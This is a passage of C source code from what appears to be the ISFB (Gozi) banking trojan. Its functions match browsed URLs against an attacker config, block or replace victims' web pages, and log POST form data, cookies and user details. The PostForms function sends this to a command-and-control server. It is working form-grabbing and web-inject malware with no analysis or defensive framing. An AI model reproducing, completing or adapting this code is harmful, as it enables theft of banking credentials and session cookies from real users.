	PTRANSFER_CONTEXT	tCtx = NULL;
	PCHAR	NewUrl;
	BOOL	bPost;

	if (cData)
	{
		do 
		{
			for (i=0; i<6; i++)
			{
				s[i] = cData + sizeof(ULONG);
				l[i] = *(ULONG*)cData;
				cData = s[i]+l[i];
			}

			if (l[0] <= 1)
				break;

			// Checking if the specified URL matches one within the config
			if ((NewUrl = UrlCheckSkipPrefix(s[0], &HttpPrefixLen, &bPost)) && 
				(HttpPrefixLen == 0 || (IsSsl && HttpPrefixLen == cstrlen(szHttps)) || (!IsSsl && HttpPrefixLen == cstrlen(szHttp))) &&
				__strwicmp(NewUrl, TargetUrl))
			{
				// Checking if the specified URL should be blocked
				if (l[1] > 1 && ((Crc32(s[1], l[1] - 1) ^ g_CsCookie) == CRC_HIDDEN))
				{
					if (bPost)
						Status = URL_STATUS_POST_BLOCK;
					else
						Status = URL_STATUS_BLOCK;
					break;
				}

				// Checking if a full page replace requested
				if (l[5]>1 && l[2]<=1 && l[1]<=1)
				{
					// Initializing page replace
					if (ptCtx)
					{
						if (InitFullReplace(TargetUrl, pReferer, NewUrl, s[5], ptCtx))
						{
							// The requested page should be completely replaced
							Status = URL_STATUS_REPLACE;
							break;
						}
					}	// if (ptCtx)
				}	// if (l[5]>1 && l[2]<=1 && l[1]<=1)
				else
					Status = URL_STATUS_ACCEPT;	
			}	// if (UrlCheckPrefix(&s[0]) && (fnd = StrStrI(pUrl, s[0])))
		} while (TRUE);
	}	// if (cData)

	return(Status);
}



//
//	Checks out if there's config information for the specified URL.	
//	If there's full replace specified for the URL initializes TRANSFER_CONTEXT and initiates receive.
//
ULONG ConfigCheckInitUrl(
	IN	PCHAR	pUrl,		// URL to check
	IN	PCHAR	pReferer,	// HTTP referer string
	IN	BOOL	IsSsl,		// specify TRUE if this is SSL connection request
	OUT	PVOID*	ptCtx		// (OPTIONAL) variable to store a pointer to TRANSFER_CONTEXT
	)
{
	ULONG	Status = URL_STATUS_UNDEF;
	PCHAR	TargetUrl;

	TargetUrl = UrlSkipHttp(pUrl, NULL);

	ConfigLockShared(&g_ConfigData);

#ifdef _URL_BLOCK_COMMAND
	// Checking if the specified URL is within the blocked URL list
	Status = ConfigCheckInitUrlInternal(TargetUrl, pReferer, IsSsl, g_ConfigData.BlockedUrlData, ptCtx);
	if (Status != URL_STATUS_BLOCK)
#endif
		// Checking if the specified URL is within our config
		Status = ConfigCheckInitUrlInternal(TargetUrl, pReferer, IsSsl, g_ConfigData.UnpackedData, ptCtx);

	ConfigUnlockShared(&g_ConfigData);

//	DbgPrint("ISFB_%04x: ConfigCheckInitUrl %u for \"%s\"\n", g_CurrentProcessId, Status, TargetUrl);

	return(Status);
}

#ifdef _URL_BLOCK_COMMAND

//
//	Adds URL-block record to the BlockedUrlData config.
//
WINERROR ConfigBlockUrl(
	PCHAR	pUrl,	// URL mask to block
	ULONG	Length	// length of the URL mask in chars
	)
{
	WINERROR Status = ERROR_NOT_ENOUGH_MEMORY;
	PCHAR	cData, s[6], pNewData = NULL;
	ULONG	l[6], i, NewDataLen;

	ConfigLockExclusive(&g_ConfigData);

	if (!(cData = g_ConfigData.BlockedUrlData))
	{
		// No Blocked Url data, creating a new one
		if (cData = hAlloc(6 * sizeof(ULONG)))
		{
			memset(cData, 0, 6 * sizeof(ULONG));
			g_ConfigData.BlockedUrlData = cData;
		}
	}	// if (!(cData = g_ConfigData.BlockedUrlData))

	if (cData)
	{
		do 
		{
			for (i=0; i<6; i++)
			{
				s[i] = cData + sizeof(ULONG);
				l[i] = *(ULONG*)cData;
				cData = s[i]+l[i];
			}

			if (l[0] <= 1)
				break;

			if ((Length == (l[0] - 1)) && !lstrcmpi(pUrl, s[0]))
			{
				Status = NO_ERROR;
				break;
			}
		} while(TRUE);

		if (Status != NO_ERROR)
		{
			NewDataLen = 2 * 6 * sizeof(ULONG) + Length + 1 + cstrlen(szHidden) + 1;
			cData = s[0] - sizeof(ULONG);

			if (!(pNewData = hRealloc(g_ConfigData.BlockedUrlData, (ULONG)(cData - g_ConfigData.BlockedUrlData) + NewDataLen)))
			{
				if (pNewData = hAlloc((ULONG)(cData - g_ConfigData.BlockedUrlData) + NewDataLen))
				{
					memcpy(pNewData, g_ConfigData.BlockedUrlData, cData - g_ConfigData.BlockedUrlData);
					hFree(g_ConfigData.BlockedUrlData);
				}
			}	// if (!(pNewData = hRealloc(...

			if (pNewData)
			{
				cData = (cData - g_ConfigData.BlockedUrlData + pNewData);
				memset(cData, 0, NewDataLen);
				NewDataLen += (ULONG)(cData - pNewData);
				// l[0]
				*(PULONG)cData = Length + 1;
				cData += sizeof(ULONG);
				// s[0]
				memcpy(cData, pUrl, Length);
				cData[Length] = 0;
				cData += Length + 1;
				// l[1]
				*(PULONG)cData = cstrlen(szHidden) + 1;
				cData += sizeof(ULONG);
				// s[1]
				memcpy(cData, szHidden, cstrlen(szHidden) + 1);

				// Updating existing config
				g_ConfigData.BlockedUrlData = pNewData;
				Status = NO_ERROR;
			}
			else
			{
				ASSERT(Status == ERROR_NOT_ENOUGH_MEMORY);
			}
		}	// if (Status != NO_ERROR)
	}	// if (cData)

	if (pNewData)
		Status = RegWriteValue(szDataRegBlockValue, pNewData, NewDataLen, REG_BINARY);

	ConfigUnlockExclusive(&g_ConfigData);

	return(Status);
}


WINERROR ConfigUnblockUrl(
	PCHAR	pUrl,	// URL mask to unblock.
	ULONG	Length	// length of the URL mask in chars
	)
{
	WINERROR Status = ERROR_FILE_NOT_FOUND;
	PCHAR	rData, cData, s[6];
	ULONG	l[6], i;

	ConfigLockExclusive(&g_ConfigData);

	if (cData = g_ConfigData.BlockedUrlData)
	{
		do 
		{
			rData = cData;

			for (i=0; i<6; i++)
			{
				s[i] = cData + sizeof(ULONG);
				l[i] = *(ULONG*)cData;
				cData = s[i]+l[i];
			}

			if (l[0] <= 1)
				break;

			if ((Length == (l[0] - 1)) && !lstrcmpi(pUrl, s[0]))
			{
				// Deleting config record
				memcpy(rData, cData, (g_ConfigData.BlockedUrlSize - (ULONG)(cData - g_ConfigData.BlockedUrlData)));
				g_ConfigData.BlockedUrlSize -= (ULONG)(cData - rData);
				cData = rData;
				Status = NO_ERROR;
			}
		} while(TRUE);
	}	// if (cData = g_ConfigData.BlockedUrlData)

	if (Status == NO_ERROR)
		Status = RegWriteValue(szDataRegBlockValue, g_ConfigData.BlockedUrlData,
			g_ConfigData.BlockedUrlSize, REG_BINARY);

	ConfigUnlockExclusive(&g_ConfigData);

	return(Status);
}

#endif	// _URL_BLOCK_COMMAND

//
//	Checks the specified URL within the config and if the URL marked there saves it's POST data into the variable.
//
static VOID SaveVar(
	LPTSTR	pUrl,	// target URL
	PVOID	lpData,	// buffer with POST data
	ULONG	dwData	// size of the buffer in bytes
	)
{
	PCHAR	s[6];
	ULONG	l[6];
	PCHAR	pData, NewUrl, TargetUrl;
	LPTSTR	VarStr;
	BOOL	bPost;

	TargetUrl = UrlSkipHttp(pUrl, NULL);

	if (VarStr = hAlloc(dwData + sizeof(_TCHAR)))
	{
		memcpy(VarStr, lpData, dwData);
		VarStr[dwData] = 0;
	
		ConfigLockShared(&g_ConfigData);

		if (pData = g_ConfigData.UnpackedData)
		{
			do 
			{
				ULONG i;
				for (i=0; i<6; i++)
				{
					l[i] = *(ULONG*)pData;
					s[i] = pData+sizeof(ULONG);
					pData = s[i]+l[i];
				}

				if (l[0] <= 1)
					break;
			
				if ((NewUrl = UrlCheckSkipPrefix(s[0], NULL, &bPost)) && __strwicmp(NewUrl, TargetUrl) && l[1] > 1)
				{
					if (_tcsicmp((LPTSTR)s[1], szPost) == 0)
						ExtractStoreVar(VarStr, s[3], s[4]);
				}
			} while(TRUE);
		}	// if (pData =

		ConfigUnlockShared(&g_ConfigData);

		hFree(VarStr);
	}	// if (VarStr = hAlloc(dwData + sizeof(_TCHAR)))
}


//
//	Creates POST-request log record and sends it to C2 server.
//
VOID PostForms(
	LPTSTR	pUrl,		// URL from the POST request
	LPTSTR	pHeaders,	// HTTP headers from the request
	LPTSTR	pCookie,	// USER-specified cookie string if any
	PVOID	lpData,		// binary data
	ULONG	Size,		// data size in bytes
	ULONG	DataId,		// ID for this type of data
	BOOL	bSaveVar	// TRUE to check URL over the config if it contains a variable
	)
{
	LPTSTR	UrlBuf;
	ULONG	BufferLen = 0, UrlBufLen, RefLen, LangLen, CookieLen = 0;
	LONG	FormHash;
	LPSTR	pReferer = NULL, pLang = NULL;

#ifdef _LOG_USER_ID
	if (g_ClientIdString)
		BufferLen = cstrlen(szUserIdFmt) + lstrlen(g_ClientIdString);
#endif

	if (g_UserNameString)
		BufferLen += cstrlen(szUserFmt) + lstrlen(g_UserNameString);

	if (pCookie)
		CookieLen = lstrlen(pCookie);

	BufferLen += cstrlen(szDateTimeFmt) + lstrlen(pUrl) + (pHeaders ? lstrlen(pHeaders) : 1) + 
		(g_UserAgentStr ? lstrlen(g_UserAgentStr) : 1) + cstrlen(szURLFmt) + CookieLen + 1;

	if (UrlBuf = hAlloc(Size + BufferLen * sizeof(_TCHAR)))
	{
		UrlBufLen = PsSupPrintDateTime(UrlBuf, NULL, TRUE);

		if (pHeaders)
		{
			// Parsing the specified HTTP headers
			pReferer = HttpFindHeaderA(pHeaders, szReferer, &RefLen);
			pLang = HttpFindHeaderA(pHeaders, szAcceptLanguage, &LangLen);
			if (!pCookie)
				pCookie = HttpFindHeaderA(pHeaders, szCookie, &CookieLen);
		}	// if (pHeaders)

		if (pReferer) pReferer[RefLen] = 0;	else pReferer = szEmptyString;
		if (pLang) pLang[LangLen] = 0; else pLang = szEmptyString;
		if (pCookie) pCookie[CookieLen] = 0; else pCookie = szEmptyString;

#ifdef	_LOG_USER_ID
		// Writing user ID to the log
		if (g_ClientIdString)
			UrlBufLen += wsprintf(UrlBuf + UrlBufLen, szUserIdFmt, g_ClientIdString);
#endif
		// Writing user name to the log
		if (g_UserNameString)
			UrlBufLen += wsprintf(UrlBuf + UrlBufLen, szUserFmt, g_UserNameString);

		// wsprintf() has limitation of 1024 kb for output buffer size, that's why we use wnsprintf() here
		UrlBufLen += wnsprintf(UrlBuf + UrlBufLen, BufferLen - UrlBufLen, szURLFmt, pUrl, pReferer, pLang, (g_UserAgentStr ? g_UserAgentStr : ""), pCookie);
		memcpy(UrlBuf + UrlBufLen, lpData, Size);

		// Since FF can send a single form multiple times, we calulate the form hash here and
		//	compare it with the previouse form sent to avoid saving the form twice or more
		FormHash = (LONG)Crc32(UrlBuf, (UrlBufLen + Size));
		if (FormHash != InterlockedExchange(&g_LastStoredFormHash, FormHash)) 
		{
			if (bSaveVar)
				// Saving form data into a variable
				SaveVar(pUrl, lpData, Size);
#ifdef _SEND_FORMS
			ConfSendData(UrlBuf, (UrlBufLen + Size), DataId, NULL, FALSE);
#else
			PipeSendCommand((DataId == SEND_ID_GRAB ? CMD_STORE_GRAB : CMD_STORE_FORM), UrlBuf, (UrlBufLen + Size), NULL);
#endif
		}	// if ((FormHash = Crc32(UrlBuf, UrlBufLen + Size)) != g_LastStoredFormHash)
		hFree(UrlBuf);
	}	// if (UrlBuf)
}


//
//	Returns TRUE if the specified content type string contains one of supported values
//
BOOL CheckContentType(
	LPTSTR	pContentType
	)
{
	BOOL bRet = FALSE;

	if (
		StrStrI(pContentType, szText) ||
		StrStrI(pContentType, szHtml) ||
		StrStrI(pContentType, szImage) ||
		StrStrI(pContentType, szJson) ||
		StrStrI(pContentType, szJavascript)
		)
		bRet = TRUE;

	return(bRet);
}